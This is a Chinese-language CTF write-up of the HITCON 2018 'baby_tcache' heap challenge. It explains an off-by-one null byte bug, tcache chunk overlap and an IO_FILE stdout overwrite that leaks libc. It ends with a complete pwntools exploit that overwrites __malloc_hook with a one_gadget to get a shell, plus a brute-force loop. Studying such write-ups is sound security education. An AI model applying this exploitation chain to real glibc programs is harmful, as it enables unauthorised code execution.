---
title: 'Hitcon:baby_tcache'
date: 2018-11-15 15:31:17
tags: pwn IO_FILE
---
# Start
收获挺大的一题,IO_FILE 真好用....angelboy,david942j真的厉害。。。
# Analysis
[附件][1]
程序逻辑很简答:
```python
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 cmd; // rax

  init_0();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      cmd = get_cmd();
      if ( cmd != 2 )
        break;
      del();
    }
    if ( cmd == 3 )
      _exit(0);
    if ( cmd == 1 )
      add();
    else
      puts("Invalid Choice");
  }
}
```
漏洞分析:

只有两个功能增加和删除
删除没啥问题
主要的漏洞点在增加:
```arm
ptr[size] = 0;
```
这里造成了one_null_byte_off

checksec:
```python
➜  baby_tcache checksec baby_tcache 
[*] '/home/n132/Desktop/baby_tcache/baby_tcache'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

```

使用的是libc-2.27(应该是。。。可能是2.26刚刚上去hitcon发现不能下载了)
# 利用思路
本题主要问题有两个
1.tcache机制下利用one_null_byte_off
2.泄露libc(一开始我是认为没有泄露的...被wp震惊了...)

# one_null_byte_off
核心思想是
```python
A|B|C ----->A|freed B|C----->A|B1,B2,blank|C
```
主要思路：

* 三个块ABC 
* free掉B块在C的pre_size位留下大小
* free掉A(进fast或者tcache反正不要和B合并),malloc(A)做一个one_null_byte_off改小B
* malloc(B1)
* malloc(B2)(B1+B2<B)
* free(B1) free(C)这样C就会有个unlink的动作overlap了B2这里注意B1不能进fast或者tcache

free(B)进unsortedbin:
B大于tcache的最大值

最后free(B1)防止进Tcache和fast绕过:
* tcache可以用塞7个free掉的chunk进一个bin来过掉
* fast只要>0x80就可以了

做了one_null_byte_off之后就可以愉快地利用tcache来任意地址写了...

# use IO_FILE
长知识了...跟着走了一遍源码...

全题唯一输出函数puts...
首先:
```c
int
_IO_puts (const char *str)
{
  int result = EOF;
  size_t len = strlen (str);
  _IO_acquire_lock (_IO_stdout);
  if ((_IO_vtable_offset (_IO_stdout) != 0
       || _IO_fwide (_IO_stdout, -1) == -1)
      && _IO_sputn (_IO_stdout, str, len) == len
      && _IO_putc_unlocked ('\n', _IO_stdout) != EOF)
    result = MIN (INT_MAX, len + 1);
  _IO_release_lock (_IO_stdout);
  return result;
}
```
这里主要实现功能的函数是_IO_sputn()
```c
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
```
也就是
```c
size_t
_IO_new_file_xsputn (FILE *f, const void *data, size_t n)
{
  const char *s = (const char *) data;
  size_t to_do = n;
  int must_flush = 0;
  size_t count = 0;
  if (n <= 0)
    return 0;
  /* This is an optimized implementation.
     If the amount to be written straddles a block boundary
     (or the filebuf is unbuffered), use sys_write directly. */
  /* First figure out how much space is available in the buffer. */
  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
    {
      count = f->_IO_buf_end - f->_IO_write_ptr;
      if (count >= n)
        {
          const char *p;
          for (p = s + n; p > s; )
            {
              if (*--p == '\n')
                {
                  count = p - s + 1;
                  must_flush = 1;
                  break;
                }
            }
        }
    }
  else if (f->_IO_write_end > f->_IO_write_ptr)
    count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */
  /* Then fill the buffer. */
  if (count > 0)
    {
      if (count > to_do)
        count = to_do;
      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
      s += count;
      to_do -= count;
    }
  if (to_do + must_flush > 0)
    {
      size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
        /* If nothing else has to be written we must not signal the
           caller that everything has been written.  */
        return to_do == 0 ? EOF : n - to_do;
      /* Try to maintain alignment: write a whole number of blocks.  */
      block_size = f->_IO_buf_end - f->_IO_buf_base;
      do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);
      if (do_write)
        {
          count = new_do_write (f, s, do_write);
          to_do -= count;
          if (count < do_write)
            return n - to_do;
        }
      /* Now write out the remainder.  Normally, this will fit in the
         buffer, but it's somewhat messier for line-buffered files,
         so we let _IO_default_xsputn handle the general case. */
      if (to_do)
        to_do -= _IO_default_xsputn (f, s+do_write, to_do);
    }
  return n - to_do;
}
```
在研究这里之前我们先看一下IO_FILE输出相关域和IO_FILE flags
```arm
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
```
IO_FILE flags
```arm
#define _IO_MAGIC         0xFBAD0000 /* Magic number */
#define _IO_MAGIC_MASK    0xFFFF0000
#define _IO_USER_BUF          0x0001 /* Don't deallocate buffer on close. */
#define _IO_UNBUFFERED        0x0002
#define _IO_NO_READS          0x0004 /* Reading not allowed.  */
#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */
#define _IO_EOF_SEEN          0x0010
#define _IO_ERR_SEEN          0x0020
#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don't call close(_fileno) on close.  */
#define _IO_LINKED            0x0080 /* In the list of all open files.  */
#define _IO_IN_BACKUP         0x0100
#define _IO_LINE_BUF          0x0200
#define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */
#define _IO_CURRENTLY_PUTTING 0x0800
#define _IO_IS_APPENDING      0x1000
#define _IO_IS_FILEBUF        0x2000
                           /* 0x4000  No longer used, reserved for compat.  */
#define _IO_USER_LOCK         0x8000
```
也就是说
* _IO_USER_BUF表示 User owns buffer
* _IO_NO_READS 不允许读
* _IO_NO_WRITES 不允许写
* _IO_DELETE_DONT_CLOSE 在删除时候不call close
* _IO_LINKED 是否在IO_list_all中
* _IO_TIED_PUT_GET 输入输出指针是否...读不懂了...
* _IO_LINE_BUF(行缓冲?....我猜的...日后知道再改)
* _IO_CURRENTLY_PUTTING(当前输出？字面意思...我也是猜的..)

然后我们再来看_IO_new_file_xsputn关键部分
P1:
```arm
if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
    {
      count = f->_IO_buf_end - f->_IO_write_ptr;
      if (count >= n)
        {
          const char *p;
          for (p = s + n; p > s; )
            {
              if (*--p == '\n')
                {
                  count = p - s + 1;
                  must_flush = 1;
                  break;
                }
            }
        }
    }
  else if (f->_IO_write_end > f->_IO_write_ptr)
    count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */
```

这里检测是否_IO_LINE_BUF和_IO_CURRENTLY_PUTTING如果是的话那么就开始计算输出长度count..
不是的话就直接用_IO_write_end-_IO_write_ptr得出count
P2:
```arm
 if (count > 0)
    {
      if (count > to_do)
        count = to_do;
      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
      s += count;
      to_do -= count;
    }
}
```
首先是conut直接大于0情况比较to_do和count然后把s memcpy 到f->_IO_write_ptr

接下来是最重要的输出环节
```arm
 if (to_do + must_flush > 0)
    {
      size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
        /* If nothing else has to be written we must not signal the
           caller that everything has been written.  */
        return to_do == 0 ? EOF : n - to_do;
      /* Try to maintain alignment: write a whole number of blocks.  */
      block_size = f->_IO_buf_end - f->_IO_buf_base;
      do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);
      if (do_write)
        {
          count = new_do_write (f, s, do_write);
          to_do -= count;
          if (count < do_write)
            return n - to_do;
        }
      /* Now write out the remainder.  Normally, this will fit in the
         buffer, but it's somewhat messier for line-buffered files,
         so we let _IO_default_xsputn handle the general case. */
      if (to_do)
        to_do -= _IO_default_xsputn (f, s+do_write, to_do);
    }
```
先计算do_write:字节数...然后call new_do_write
===>
```arm
new_do_write (FILE *fp, const char *data, size_t to_do)
{
  size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      off64_t new_pos
        = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
        return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  fp->_IO_write_end = (fp->_mode <= 0
                       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
                       ? fp->_IO_buf_base : fp->_IO_buf_end);
  return count;
}
```

先是确定fp->_offset
然后call了 最终的输出_IO_SYSWRITE

整个puts的过程简单如上所示现在回到我们题目上来.
我们可以通过控制partial write 做tcache attack 控制IO_FILE更改IO_FILE做输出
思路如下:
* 我们需要控制和输出相关的那三个域_IO_write_base,_IO_write_ptr,_IO_write_end
* 但是我们没有任何leak所以不知道任何地址,比较保险的办法是partial write _IO_write_base
* 所以我们可以选择改小_IO_write_base--->\x00
* 之后我们只要正确设置_flags就可以leak
* 那么如何设置_flags由前面_flags各个域的意义我们可以选择一些要用的域例如
```python
_flags=_IO_MAGIC+_IO_CURRENTLY_PUTTING+_IO_IS_APPENDING+（_IO_LINKED）

1) _IO_MAGIC:magic num
2) _IO_LINKED:在IO_list_all内... 测试好像可有可无但是尊重事实加上去吧...
3) _IO_CURRENTLY_PUTTING:当前输出 经测试没有的话不会leak
4) IO_IS_APPENDING:在new_do_write内走比较简单的那个分支...正确处理的话走另一个也可以
_flags=0xfbad1800 or 0xfbad1880 或者再加一些其他不影响leak的_flags
发现最低字节`&2==1`的话之后还是会输出换行符,所以最好设置成 _flags=0x1802（AD-2019-12-07）
```

终于搞定这两件事情...那么总的思路就是
* 通过one_null_byte_off控制IO_file造成leak
* 做tcache atk改写__malloc_hook

# EXP
```python
from pwn import *
#context.log_level="debug"
def cmd(c):
	p.readuntil("Your choice: ")
	p.sendline(str(c))
def add(size,data):
	cmd(1)
	p.sendlineafter("Size:",str(size))
	p.sendafter("Data:",data)
def free(idx):
	cmd(2)
	p.sendlineafter("Index:",str(idx))
p=process("./baby_tcache")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
for x in range(6):
	add(0x80,"\n")#0

add(0x38,"\n")#6
# fill up the tcache
add(0x8e0,"\n")#7 E
add(0x440,'\n')#8 C
add(0x80,'\n')#9 D
free(6)
free(7)

add(0x18,'\n')#6
add(0x80,'\n')#7

for x in range(6):
	free(x)
add(0x60,'\n')#0
free(0)
free(6)
free(9)
free(7)
free(8)


add(0x6f0,'\n')#0

add(0x20,'\n')#1
add(0x50,'\n')#2

add(0x100,'\x60\x07\xdd')#3

add(0x60,"\n")#4
gdb.attach(p)
add(0x60,p64(0xfbad1800)+p64(0)*3+'\x00')#5

p.read(8)
base=u64(p.read(6).ljust(8,'\x00'))-(0x7ffff7dd18b0-0x7ffff79e4000)
log.warning(hex(base))
free(4)
free(3)

libc.address=base
add(0x100,p64(libc.symbols['__malloc_hook']-35))
add(0x100,"\n")
one=base+0x10a38c
add(0x100,'\x00'*35+p64(one))

cmd(1)
p.sendlineafter("ize:",'\n')
p.interactive()


```
partial write 了 3byte 应该是 256*16次有一次成功...
我测试的运气超好...20秒钟就成功了
```sh
for x in `seq 4096`;do
	python exp.py
done
```

[1]:https://github.com/n132/Watermalon/tree/master/Hitcon_2018/baby_tcache